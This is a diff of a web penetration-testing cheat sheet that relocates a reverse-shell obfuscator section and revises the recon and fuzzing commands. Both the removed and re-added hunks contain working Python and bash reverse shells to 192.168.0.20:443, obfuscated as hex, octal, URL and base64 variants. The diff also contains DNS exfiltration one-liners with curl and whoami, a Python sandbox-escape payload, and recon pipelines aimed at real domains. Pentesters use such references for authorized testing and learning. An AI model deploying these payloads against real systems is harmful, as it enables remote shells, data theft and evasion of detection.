@@ -121,38 +121,6 @@ X-Client-IP: 127.0.0.1
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
 
-### Reverse Shell Obfuscator
-e.g.  
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
-```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
-```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```  
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  
-
-```
-py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
-```  
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type urle`  
-```
-py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
-```
-`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64`  
-```
-cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
-```
-`
-python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
-`
-```
-bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
-```
-
-https://github.com/rodolfomarianocy/hackshell  
-
 ## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
 
 ### XSS Protection
@@ -1322,13 +1290,45 @@ https://nodejs.org/api/child_process.html#child_processexeccommand-options-callb
 ```  
 https://nodejs.org/api/process.html
 
-### RCE - Exfiltrating via dns
+## Remote Code Execution
 
+### RCE - Exfiltrating via dns
 ```
 curl http://$(whoami).site.com/
 curl http://`whoami`.site.com/
 ```
-   
+
+### Reverse Shell Obfuscator
+e.g.  
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type hex`  
+```
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0xC0A80014",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type octa`  
+```
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0300.0250.0000.0024",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```  
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type long`  
+
+```
+py$()thon -$()c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3232235540",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```  
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type urle`  
+```
+py%24%28%29thon%20%24%28%29c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.0.20%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27
+```
+`python hackshell.py --payload python --lhost 192.168.0.20 --lport 443 --type b64`  
+```
+cHkkKCl0aG9uIC0kKCljICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTkyLjE2OC4wLjIwIiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJzaCIpJw==
+```
+`
+python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre
+`
+```
+bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
+```
+https://github.com/rodolfomarianocy/hackshell  
+
 -> Tricks - Bypass  
 `"__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('id')";`
 
@@ -1343,38 +1343,33 @@ https://wpscan.com/wordpress-security-scanner
 
 #### Joomla!
 -> Tool  
+`python main.py -u <target>`
 https://github.com/oppsec/juumla
 
 #### Drupal
 -> Tool  
+`droopescan scan drupal -u <target> -t 32`
 https://github.com/SamJoan/droopescan
 
 ## Fuzzing (+) 
 
-### Wordlist for subdomain fuzzing
-https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
-
 ### Fuzzing Subdomain - DNS
-
 `ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
 
 ### Fuzzing Subdomain - VHOST
-  
 `ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx`
 
 ### Fuzzing File Extension
-  
-`ffuf -u "https://site.com/indexFUZZ" -w web-extensions.txt -fs xxx`
+`ffuf -u "https://site.com/indexFUZZ" -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -fs xxx`
 
 ### Fuzzing Parameter GET
-
 `ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx`
   
 ### Fuzzing Parameter POST
-  
-`ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx`
+`ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx`  
+https://github.com/danielmiessler/SecLists
 
-## Web Recon (+)
+## Recon (+)
 ### Recon in ASN  
 -> asnpepper  
 `python asnpepper.py -o <org> -O output.txt`  
@@ -1388,78 +1383,48 @@ https://github.com/rodolfomarianocy/asnpepper
 https://github.com/robertdavidgraham/masscan  
 
 ### One Line Commands
-#### Parameters Discovery
-`python paramspider.py -d stripe.com | uro | httpx -fc 404 | anew spider_parameters.txt`  
-`echo stripe.com | gau | gf xss | uro |  httpx -fc 404 | anew gau_parameters.txt`
+-> Parameters Discovery  
+`python paramspider.py -d stripe.com | uro | httpx -fc 404 -silent | anew spider_parameters.txt && echo stripe.com | gau | gf xss | uro |  httpx -fc 404 -silent | anew gau_parameters.txt`
 
-### Other Steps
-
+### Steps - Recon Web
 #### 1 - Subdomain Discovery
+1.1 -> sublist3r+sort|uniq+httpx+anew
+`subslit3r -d site.com | sort | uniq | httpx -silent | anew subdomains.txt`
 
-1.1-> sublist3r
+1.2 -> subfinder+sort|uniq+httpx+anew
+`subfinder -d site.com  | sort | uniq | httpx -silent | anew subdomains.txt`
 
-`subslit3r -d site.com -o sublist3r_subdomains.txt`
+1.3 -> crt+jq+grep+httpx+anew  
+`curl "https://crt.sh/?q=$1&output=json" | jq -r '.[].name_value' | grep -v "*" | httpx -silent | anew subdomains.txt`
 
-1.2-> ctfr
+#### 2 - Parameter Discovery
+2.1 -> gau+gf+uro+httpx+anew
+`cat subdomains.txt | gau | gf xss | uro | httpx -silent | anew parameters.txt`
 
-`python ctfr.py -d site.com -o ctfr_subdomains.txt`
+2.2 -> paramspider + uro + httpx
+`cat subdomains.txt | xargs -n 1 python paramspider.py -d |httpx -silent | gf xss | uro | anew parameters.txt`  
 
-1.3-> Merge sublist3r+ctfr
-
-`cat sublist3r_subdomains.txt ctfr_subdomains.txt > merge_subdomains.txt`
-
-1.4-> Filter and Status Check
-
-`cat merge_subdomains.txt | sort | uniq | grep -v "*" | httpx -o checked_subdomains.txt`
-
-#### 2 - URL Discovery - Fetches known URLs
-
-2.1 -> gau
-
-`cat checked_subdomains.txt | gau > gau_urls.txt`
-
-2.2 -> Filter and Status Check
-
-`cat gau_urls.txt | gf xss | httpx -o checked_urls.txt`
-
-#### 3 - Parameter Discovery
-
-3.1 -> gau+gf+uro+httpx
-
-`cat gau_urls.txt | gf xss | uro | httpx -fc 404 -o parameters_gau.txt`
-
-3.2 -> paramspider + uro + httpx
-
-`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`  
-`cat paramspider.txt | uro | httpx -fc 404 -o paramspider_final.txt`
-
-#### 4 - Files Discovery
-
-4.1 -> gau+grep+httpx
-
-`cat gau_urls.txt | grep "\.js" | httpx -fc 404 -o js_files.txt`  
+#### 3 - Files Discovery
+3.1 -> gau+grep+httpx
+`cat subdomains.txt | grep "\.js" | httpx -fc 404 -o js_files.txt`  
 
 -> Used Tools
-
-https://github.com/aboul3la/Sublist3r.git  
-https://github.com/UnaPibaGeek/ctfr  
+https://github.com/projectdiscovery/subfinder  
+https://github.com/aboul3la/Sublist3r  
 https://github.com/devanshbatham/ParamSpider  
+https://github.com/s0md3v/uro  
 https://github.com/projectdiscovery/httpx  
 https://github.com/tomnomnom/gf  
+https://github.com/stedolan/jq  
 
 #### Other Tools
-
--> Project Discovery (Subdomain Discovery)
-
+-> Project Discovery (Subdomain Discovery)  
 https://chaos.projectdiscovery.io/#/
 
--> aquatone (Tool for visual inspection of websites)
-
+-> aquatone (Tool for visual inspection of websites)  
 https://github.com/michenriksen/aquatone
 
-
 ### Certifications
-
 #### elearn Web Application Penetration Tester eXtreme - eWPTX
 Apresentation def con Caxias do Sul - DCG5554  
 https://www.youtube.com/watch?v=2-im6aL6PkI 
